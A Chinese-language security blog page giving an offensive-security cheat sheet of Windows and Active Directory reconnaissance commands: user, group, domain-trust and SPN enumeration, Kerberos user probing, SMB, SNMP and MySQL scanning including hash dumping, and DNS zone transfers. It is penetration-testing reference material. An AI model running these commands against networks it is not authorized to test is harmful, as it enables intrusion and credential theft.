

<!DOCTYPE html>
<html lang="zh-CN" data-default-color-scheme=auto>



<head>
  <meta charset="UTF-8">
  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
  <link rel="icon" href="/img/fluid.png">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="author" content="shiyan">
  <meta name="keywords" content="">
  
    <meta name="description" content="笔记说明：该笔记是国外 hacktoday.net 论坛上的一篇笔记文章，我整体翻译了注释的内容，并根据个人打靶学习情况，增加或删除了一部分内容，至此放置博客上留作后续复习使用，以及方便各位浏览到我博客的安全爱好者参考使用。">
<meta property="og:type" content="article">
<meta property="og:title" content="Windows 命令备忘笔记集合-hacktoday.net-2020.12.01版本">
<meta property="og:url" content="https://sh1yan.top/2024/06/02/Windows-Command-Notes-Collection-hacktoday-net-20201201/index.html">
<meta property="og:site_name" content="sh1yan&#39;blog">
<meta property="og:description" content="笔记说明：该笔记是国外 hacktoday.net 论坛上的一篇笔记文章，我整体翻译了注释的内容，并根据个人打靶学习情况，增加或删除了一部分内容，至此放置博客上留作后续复习使用，以及方便各位浏览到我博客的安全爱好者参考使用。">
<meta property="og:locale" content="zh_CN">
<meta property="article:published_time" content="2024-06-02T15:50:55.000Z">
<meta property="article:modified_time" content="2024-06-02T15:04:42.000Z">
<meta property="article:author" content="shiyan">
<meta property="article:tag" content="Offensive security">
<meta property="article:tag" content="Windows Command Notes">
<meta name="twitter:card" content="summary_large_image">
  
  
  
  <title>Windows 命令备忘笔记集合-hacktoday.net-2020.12.01版本 - sh1yan&#39;blog</title>

  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />



  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />



<!-- 主题依赖的图标库，不要自行修改 -->
<!-- Do not modify the link that theme dependent icons -->

<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">



<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">


<link  rel="stylesheet" href="/css/main.css" />


  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
  
    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
  




  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    Fluid.ctx = Object.assign({}, Fluid.ctx)
    var CONFIG = {"hostname":"sh1yan.top","root":"/","version":"1.9.5","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};

    if (CONFIG.web_analytics.follow_dnt) {
      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
    }
  </script>
  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
  


  
<meta name="generator" content="Hexo 6.3.0"></head>


<body>
  

  <header>
    

<div class="header-inner" style="height: 70vh;">
  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand" href="/">
      <strong>sh1yan&#39;blog</strong>
    </a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/" target="_self">
                <i class="iconfont icon-home-fill"></i>
                <span>首页</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/" target="_self">
                <i class="iconfont icon-archive-fill"></i>
                <span>归档</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/" target="_self">
                <i class="iconfont icon-tags-fill"></i>
                <span>标签</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/" target="_self">
                <i class="iconfont icon-user-fill"></i>
                <span>关于</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/yqlj/" target="_self">
                <i class="iconfont icon-link-fill"></i>
                <span>友链</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item dropdown">
              <a class="nav-link dropdown-toggle" target="_self" href="javascript:;" role="button"
                 data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
                <i class="iconfont icon-th-large"></i>
                <span>其他</span>
              </a>
              <div class="dropdown-menu" aria-labelledby="navbarDropdown">
                
                  
                  
                  
                  <a class="dropdown-item" href="/open-source/" target="_self">
                    
                    <span>我的开源工具列表</span>
                  </a>
                
                  
                  
                  
                  <a class="dropdown-item" href="/rt-cmd/" target="_self">
                    
                    <span>反弹shell命令集合</span>
                  </a>
                
                  
                  
                  
                  <a class="dropdown-item" href="/reverse-shell/" target="_self">
                    
                    <span>简易反弹shell集合</span>
                  </a>
                
                  
                  
                  
                  <a class="dropdown-item" href="/WebDeveloper/" target="_self">
                    
                    <span>网站开发者工具箱</span>
                  </a>
                
                  
                  
                  
                  <a class="dropdown-item" href="/linux-command/" target="_self">
                    
                    <span>Linux命令工具箱</span>
                  </a>
                
                  
                  
                  
                  <a class="dropdown-item" href="/CyberChef/" target="_self">
                    
                    <span>CyberChef工具箱</span>
                  </a>
                
                  
                  
                  
                  <a class="dropdown-item" href="/Quick-Reference/" target="_self">
                    
                    <span>开发者速查备忘录</span>
                  </a>
                
                  
                  
                  
                  <a class="dropdown-item" href="/SQLMapCG-CN/" target="_self">
                    
                    <span>SQLMap命令生成器</span>
                  </a>
                
                  
                  
                  
                  <a class="dropdown-item" href="/nuclei/" target="_self">
                    
                    <span>Nuclei命令生成器</span>
                  </a>
                
                  
                  
                  
                  <a class="dropdown-item" href="/cvssjs/" target="_self">
                    
                    <span>CVSSv3.1 漏洞评分</span>
                  </a>
                
              </div>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
              <i class="iconfont icon-search"></i>
            </a>
          </li>
          
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
            </a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

  

<div id="banner" class="banner" parallax=true
     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
  <div class="full-bg-img">
    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
      <div class="banner-text text-center fade-in-up">
        <div class="h2">
          
            <span id="subtitle" data-typed-text="Windows 命令备忘笔记集合-hacktoday.net-2020.12.01版本"></span>
          
        </div>

        
          
  <div class="mt-3">
    
    
      <span class="post-meta">
        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
        <time datetime="2024-06-02 23:50" pubdate>
          2024年6月2日 晚上
        </time>
      </span>
    
  </div>

  <div class="mt-1">
    
      <span class="post-meta mr-2">
        <i class="iconfont icon-chart"></i>
        
          43k 字
        
      </span>
    

    
      <span class="post-meta mr-2">
        <i class="iconfont icon-clock-fill"></i>
        
        
        
          363 分钟
        
      </span>
    

    
    
  </div>


        
      </div>

      
    </div>
  </div>
</div>

</div>

  </header>

  <main>
    
      

<div class="container-fluid nopadding-x">
  <div class="row nomargin-x">
    <div class="side-col d-none d-lg-block col-lg-2">
      

    </div>

    <div class="col-lg-8 nopadding-x-md">
      <div class="container nopadding-x-md" id="board-ctn">
        <div id="board">
          <article class="post-content mx-auto">
            <h1 id="seo-header">Windows 命令备忘笔记集合-hacktoday.net-2020.12.01版本</h1>
            
            
              <div class="markdown-body">
                
                <h1 id="笔记说明："><a href="#笔记说明：" class="headerlink" title="笔记说明："></a>笔记说明：</h1><p>该笔记是国外 hacktoday.net 论坛上的一篇笔记文章，我整体翻译了注释的内容，并根据个人打靶学习情况，增加或删除了一部分内容，至此放置博客上留作后续复习使用，以及方便各位浏览到我博客的安全爱好者参考使用。</p>
<span id="more"></span>  

<h1 id="一、Windows-基础信息枚举"><a href="#一、Windows-基础信息枚举" class="headerlink" title="一、Windows 基础信息枚举"></a>一、Windows 基础信息枚举</h1><h2 id="账号及用户组信息枚举"><a href="#账号及用户组信息枚举" class="headerlink" title="账号及用户组信息枚举"></a>账号及用户组信息枚举</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs powershell">net users <span class="hljs-comment"># 当前用户列表信息</span><br>net users /domain  <span class="hljs-comment"># 当前域内用户列表信息</span><br>net localgroup <span class="hljs-comment"># 本地组列表信息</span><br>net groups /domain <span class="hljs-comment"># 域用户组列表信息</span><br>net groups /domain <span class="hljs-string">&quot;Domain Admins&quot;</span> <span class="hljs-comment"># 域管理员组列表信息</span><br><br><span class="hljs-built_in">Get-ADUser</span><br><span class="hljs-built_in">Get-Domain</span><br><span class="hljs-built_in">Get-DomainUser</span><br><span class="hljs-built_in">Get-DomainGroup</span><br><span class="hljs-built_in">Get-DomainGroupMember</span> <span class="hljs-literal">-identity</span> <span class="hljs-string">&quot;Domain Admins&quot;</span> <span class="hljs-literal">-Domain</span> m0chanAD.local <span class="hljs-literal">-DomainController</span> <span class="hljs-number">10.10</span>.<span class="hljs-number">14.10</span><br><span class="hljs-built_in">Find-DomainShare</span><br><br><br><span class="hljs-comment"># 主机发现</span><br>netdiscover <span class="hljs-literal">-r</span> subnet/<span class="hljs-number">24</span><br>nbtscan <span class="hljs-literal">-r</span> [<span class="hljs-type">range</span>]<br><span class="hljs-keyword">for</span> /L %i <span class="hljs-keyword">in</span> (<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">255</span>) <span class="hljs-keyword">do</span>  @ping.exe <span class="hljs-literal">-n</span> <span class="hljs-number">1</span> <span class="hljs-literal">-w</span> <span class="hljs-number">50</span> &lt;<span class="hljs-number">10.10</span>.<span class="hljs-number">10</span>&gt;.%i | findstr TTL<br><br><br><span class="hljs-comment"># 反向DNS查找</span><br><span class="hljs-variable">$ComputerIPAddress</span> = <span class="hljs-string">&quot;10.10.14.14&quot;</span><br>[<span class="hljs-type">System.Net.Dns</span>]::GetHostEntry(<span class="hljs-variable">$ComputerIPAddress</span>).HostName<br></code></pre></td></tr></table></figure>
<h2 id="使用-SPN-的用户"><a href="#使用-SPN-的用户" class="headerlink" title="使用 SPN 的用户"></a>使用 SPN 的用户</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment"># https://github.com/tevora-threat/SharpView</span><br><br><span class="hljs-built_in">Get-DomainUser</span> <span class="hljs-literal">-SPN</span><br><br><span class="hljs-built_in">Get-ADComputer</span> <span class="hljs-literal">-filter</span> &#123;ServicePrincipalName <span class="hljs-operator">-like</span> &lt;keyword&gt;&#125; <span class="hljs-literal">-Properties</span> OperatingSystem,OperatingSystemVersion,OperatingSystemServicePack,<br>PasswordLastSet,LastLogonDate,ServicePrincipalName,TrustedForDelegation,TrustedtoAuthForDelegation<br><br></code></pre></td></tr></table></figure>
<h2 id="批量-Kerberos-主机枚举"><a href="#批量-Kerberos-主机枚举" class="headerlink" title="批量 Kerberos 主机枚举"></a>批量 Kerberos 主机枚举</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">nmap <span class="hljs-variable">$TARGET</span> <span class="hljs-literal">-p</span> <span class="hljs-number">88</span> <span class="hljs-literal">--script</span> krb5<span class="hljs-literal">-enum-users</span> <span class="hljs-literal">--script-args</span> krb5<span class="hljs-literal">-enum-users</span>.realm=<span class="hljs-string">&#x27;test&#x27;</span><br></code></pre></td></tr></table></figure>
<h2 id="进攻型-CSharp-Scripts-枚举"><a href="#进攻型-CSharp-Scripts-枚举" class="headerlink" title="进攻型 CSharp Scripts 枚举"></a>进攻型 CSharp Scripts 枚举</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment"># https://github.com/Mr-Un1k0d3r/RedTeamCSharpScripts</span><br><br>LDAPUtility.cs<br><br>Usage: ldaputility.exe options domain [<span class="hljs-type">arguments</span>]<br><br>ldaputility.exe DumpAllUsers m0chan<br>ldaputility.exe DumpUser m0chan mr.un1k0d3<span class="hljs-built_in">r</span><br>ldaputility.exe DumpUsersEmail m0chan<br>ldaputility.exe DumpAllComputers m0chan <br>ldaputility.exe DumpComputer m0chan DC01<br>ldaputility.exe DumpAllGroups m0chan<br>ldaputility.exe DumpGroup m0chan <span class="hljs-string">&quot;Domain Admins&quot;</span><br>ldaputility.exe DumpPasswordPolicy m0chan<br><br>还有用于WMI调用的WMIUtility.cs和用于原始LDAP查询的LDAPQuery.cs。<br>有关详细信息，请参阅上面链接的github。<br></code></pre></td></tr></table></figure>
<h2 id="AD域基础手动信息枚举"><a href="#AD域基础手动信息枚举" class="headerlink" title="AD域基础手动信息枚举"></a>AD域基础手动信息枚举</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><code class="hljs powershell">nltest /DCLIST:DomainName  <span class="hljs-comment"># 查找主域名，DomainName 是需要输入当前域名的参数</span><br>nltest /DCNAME:DomainName  <span class="hljs-comment"># 查看域中主DC的名字</span><br>nltest /DSGETDC:DomainName <span class="hljs-comment"># 查询域控主机名</span><br><br><span class="hljs-comment"># 获取当前域信息-类似于获取域</span><br>[<span class="hljs-type">System.DirectoryServices.ActiveDirectory.Domain</span>]::GetCurrentDomain()<br><br><span class="hljs-comment"># 获取域信任信息-类似于获取域信任</span><br>([<span class="hljs-type">System.DirectoryServices.ActiveDirectory.Domain</span>]::GetCurrentDomain()).GetAllTrustRelationships()<br><br><span class="hljs-comment"># 查看域信息</span><br>[<span class="hljs-type">System.DirectoryServices.ActiveDirectory.Forest</span>]::GetCurrentForest()<br><br><span class="hljs-comment">#  查看域信任信息</span><br>([<span class="hljs-type">System.DirectoryServices.ActiveDirectory.Forest</span>]::GetForest((<span class="hljs-built_in">New-Object</span> System.DirectoryServices.ActiveDirectory.DirectoryContext(<span class="hljs-string">&#x27;Forest&#x27;</span>, <span class="hljs-string">&#x27;forest-of-interest.local&#x27;</span>)))).GetAllTrustRelationships()<br><br>nltest [<span class="hljs-type">server</span>:&lt;<span class="hljs-type">fqdn_foreign_domain</span>&gt;] /domain_trusts /all_trusts /v<br><br>nltest /dsgetfti:&lt;domain&gt;<br><br>nltest /server:&lt;ip_dc&gt; /domain_trusts /all_trusts<br><br>([<span class="hljs-type">System.DirectoryServices.ActiveDirectory.Domain</span>]::GetCurrentDomain()).GetAllTrustRelationships()<br><br><span class="hljs-comment"># 查看所有域控制器</span><br>nltest /dclist:offense.local<br>net <span class="hljs-built_in">group</span> <span class="hljs-string">&quot;domain controllers&quot;</span> /domain<br><br><span class="hljs-comment"># 查看当前会话的DC</span><br>nltest /dsgetdc:m0chanAD.local<br><br><span class="hljs-comment"># 从CMD查看域信任</span><br>nltest /domain_trusts<br><br><span class="hljs-comment"># 从CMD查看用户信息</span><br>nltest /user:<span class="hljs-string">&quot;m0chan&quot;</span><br><br><span class="hljs-comment"># 获取通过身份验证的用户的域名和DC</span><br>klist<br><br><span class="hljs-comment"># 获取所有登录的会话，包括NTLM和Kerberos</span><br>klist sessions<br><br><span class="hljs-comment"># 查看 Kerb 票据</span><br>klist<br><br><span class="hljs-comment"># 查看缓存的Krbtgt</span><br>klist tgt<br><br><span class="hljs-comment"># 旧Windows系统上的whoami</span><br><span class="hljs-built_in">set</span> u<br><br><span class="hljs-comment"># 列出域内所有用户名</span><br>([<span class="hljs-type">adsisearcher</span>]<span class="hljs-string">&quot;(&amp;(objectClass=User)(samaccountname=*))&quot;</span>).FindAll().Properties.samaccountname<br><br><span class="hljs-comment"># 列出域内管理员</span><br><br>([<span class="hljs-type">adsisearcher</span>]<span class="hljs-string">&quot;(&amp;(objectClass=User)(admincount=1))&quot;</span>).FindAll().Properties.samaccountname<br><br><span class="hljs-comment"># 列出有关特定用户的所有信息</span><br><br>([<span class="hljs-type">adsisearcher</span>]<span class="hljs-string">&quot;(&amp;(objectClass=User)(samaccountname=&lt;username&gt;))&quot;</span>).FindAll().Properties<br><br><span class="hljs-comment"># 查看设置了描述字段的所有用户</span><br><br>([<span class="hljs-type">adsisearcher</span>]<span class="hljs-string">&quot;(&amp;(objectClass=group)(samaccountname=*))&quot;</span>).FindAll().Properties | % &#123; <span class="hljs-built_in">Write-Host</span> <span class="hljs-variable">$_</span>.samaccountname : <span class="hljs-variable">$_</span>.description <br></code></pre></td></tr></table></figure>
<h2 id="基于Linux域环境中的AD工具枚举"><a href="#基于Linux域环境中的AD工具枚举" class="headerlink" title="基于Linux域环境中的AD工具枚举"></a>基于Linux域环境中的AD工具枚举</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment"># https://github.com/jasonwbarnett/linux-adtool</span><br><br>tar zxvf adtools<span class="hljs-literal">-1</span>.x.tar.gz<br><span class="hljs-built_in">cd</span> adtools<span class="hljs-literal">-1</span>.x<br>./configure<br>make<br>make install<br><br>&gt; adtool list ou=user,dc=example,dc=com<br>CN=allusers,OU=user,DC=example,DC=com<br>OU=finance,OU=user,DC=example,DC=com<br>OU=administration,OU=user,DC=example,DC=com<br><br>&gt; adtool oucreate marketing ou=user,dc=example,dc=com<br>&gt; adtool useradd jsmith ou=marketing,ou=user,dc=example,dc=com<br>&gt; adtool setpass jsmith banana<br>&gt; adtool unlock jsmith<br>&gt; adtool groupadd allusers jsmith<br>&gt; adtool attributereplace jsmith telephonenumber <span class="hljs-number">123</span><br>&gt; adtool attributereplace jsmith mail jsmith@example.com<br></code></pre></td></tr></table></figure>
<h2 id="SharpView-工具枚举参数"><a href="#SharpView-工具枚举参数" class="headerlink" title="SharpView 工具枚举参数"></a>SharpView 工具枚举参数</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment"># https://github.com/tevora-threat/SharpView</span><br><br><span class="hljs-built_in">Get-DomainFileServer</span><br><span class="hljs-built_in">Get-DomainGPOUserLocalGroupMapping</span><br><span class="hljs-built_in">Find-GPOLocation</span><br><span class="hljs-built_in">Get-DomainGPOComputerLocalGroupMapping</span><br><span class="hljs-built_in">Find-GPOComputerAdmin</span><br><span class="hljs-built_in">Get-DomainObjectAcl</span><br><span class="hljs-built_in">Get-ObjectAcl</span><br><span class="hljs-built_in">Add-DomainObjectAcl</span><br><span class="hljs-built_in">Add-ObjectAcl</span><br><span class="hljs-built_in">Remove-DomainObjectAcl</span><br><span class="hljs-built_in">Get-RegLoggedOn</span><br><span class="hljs-built_in">Get-LoggedOnLocal</span><br><span class="hljs-built_in">Get-NetRDPSession</span><br><span class="hljs-built_in">Test-AdminAccess</span><br><span class="hljs-built_in">Invoke-CheckLocalAdminAccess</span><br><span class="hljs-built_in">Get-WMIProcess</span><br><span class="hljs-built_in">Get-NetProcess</span><br><span class="hljs-built_in">Get-WMIRegProxy</span><br><span class="hljs-built_in">Get-Proxy</span><br><span class="hljs-built_in">Get-WMIRegLastLoggedOn</span><br><span class="hljs-built_in">Get-LastLoggedOn</span><br><span class="hljs-built_in">Get-WMIRegCachedRDPConnection</span><br><span class="hljs-built_in">Get-CachedRDPConnection</span><br><span class="hljs-built_in">Get-WMIRegMountedDrive</span><br><span class="hljs-built_in">Get-RegistryMountedDrive</span><br><span class="hljs-built_in">Find-InterestingDomainAcl</span><br><span class="hljs-built_in">Invoke-ACLScanner</span><br><span class="hljs-built_in">Get-NetShare</span><br><span class="hljs-built_in">Get-NetLoggedon</span><br></code></pre></td></tr></table></figure>
<h2 id="SMB服务枚举命令集合"><a href="#SMB服务枚举命令集合" class="headerlink" title="SMB服务枚举命令集合"></a>SMB服务枚举命令集合</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs powershell">nmap <span class="hljs-literal">-p</span> <span class="hljs-number">139</span>,<span class="hljs-number">445</span> <span class="hljs-literal">--script</span> smb.nse,smb<span class="hljs-literal">-enum-shares</span>,smbls<br>enum4linux <span class="hljs-number">1.3</span>.<span class="hljs-number">3.7</span><br>smbmap <span class="hljs-literal">-H</span> <span class="hljs-number">1.3</span>.<span class="hljs-number">3.7</span><br>smbclient <span class="hljs-literal">-L</span> \\INSERTIPADDRESS<br>smbclient <span class="hljs-literal">-L</span> INSERTIPADDRESS<br>smbclient //INSERTIPADDRESS/tmp<br>smbclient \\\\INSERTIPADDRESS\\ipc<span class="hljs-variable">$</span> <span class="hljs-literal">-U</span> john<br>smbclient //INSERTIPADDRESS/ipc<span class="hljs-variable">$</span> <span class="hljs-literal">-U</span> john<br>smbclient //INSERTIPADDRESS/admin<span class="hljs-variable">$</span> <span class="hljs-literal">-U</span> john<br>nbtscan [<span class="hljs-type">SUBNET</span>]<br><br><br><span class="hljs-comment">#Check for SMB Signing</span><br>nmap <span class="hljs-literal">--script</span> smb<span class="hljs-literal">-security-mode</span>.nse <span class="hljs-literal">-p</span> <span class="hljs-number">445</span> <span class="hljs-number">10.10</span>.<span class="hljs-number">14.14</span><br></code></pre></td></tr></table></figure>
<h2 id="SNMP服务枚举命令集合"><a href="#SNMP服务枚举命令集合" class="headerlink" title="SNMP服务枚举命令集合"></a>SNMP服务枚举命令集合</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs powershell">snmpwalk <span class="hljs-literal">-c</span> public <span class="hljs-literal">-v1</span> <span class="hljs-number">10.10</span>.<span class="hljs-number">14.14</span><br>snmpcheck <span class="hljs-literal">-t</span> <span class="hljs-number">10.10</span>.<span class="hljs-number">14.14</span> <span class="hljs-literal">-c</span> public<br>onesixtyone <span class="hljs-literal">-c</span> names <span class="hljs-literal">-i</span> hosts<br>nmap <span class="hljs-literal">-sT</span> <span class="hljs-literal">-p</span> <span class="hljs-number">161</span> <span class="hljs-number">10.10</span>.<span class="hljs-number">14.14</span> <span class="hljs-literal">-oG</span> snmp_results.txt<br>snmpenum <span class="hljs-literal">-t</span> <span class="hljs-number">10.10</span>.<span class="hljs-number">14.14</span><br></code></pre></td></tr></table></figure>
<h2 id="MySQL服务枚举命令"><a href="#MySQL服务枚举命令" class="headerlink" title="MySQL服务枚举命令"></a>MySQL服务枚举命令</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">nmap <span class="hljs-literal">-sV</span> <span class="hljs-literal">-Pn</span> <span class="hljs-literal">-vv</span>  <span class="hljs-number">10.0</span>.<span class="hljs-number">0.1</span> <span class="hljs-literal">-p</span> <span class="hljs-number">3306</span> <span class="hljs-literal">--script</span> mysql<span class="hljs-literal">-audit</span>,mysql<span class="hljs-literal">-databases</span>,mysql<span class="hljs-literal">-dump-hashes</span>,mysql<span class="hljs-literal">-empty-password</span>,mysql<span class="hljs-literal">-enum</span>,mysql<span class="hljs-literal">-info</span>,mysql<span class="hljs-literal">-query</span>,mysql<span class="hljs-literal">-users</span>,mysql<span class="hljs-literal">-variables</span>,mysql<span class="hljs-literal">-vuln-cve2012-2122</span><br></code></pre></td></tr></table></figure>
<h2 id="DNS区域传输枚举"><a href="#DNS区域传输枚举" class="headerlink" title="DNS区域传输枚举"></a>DNS区域传输枚举</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs powershell">dig axfr blah.com @ns1.m0chan.com<br>nslookup -&gt; <span class="hljs-built_in">set</span> <span class="hljs-built_in">type</span>=any -&gt; <span class="hljs-built_in">ls</span> <span class="hljs-literal">-d</span> m0chan.com<br>dnsrecon <span class="hljs-literal">-d</span> m0chan <span class="hljs-literal">-D</span> /usr/share/wordlists/dnsmap.txt <span class="hljs-literal">-t</span> std <span class="hljs-literal">--xml</span> ouput.xml<br></code></pre></td></tr></table></figure>
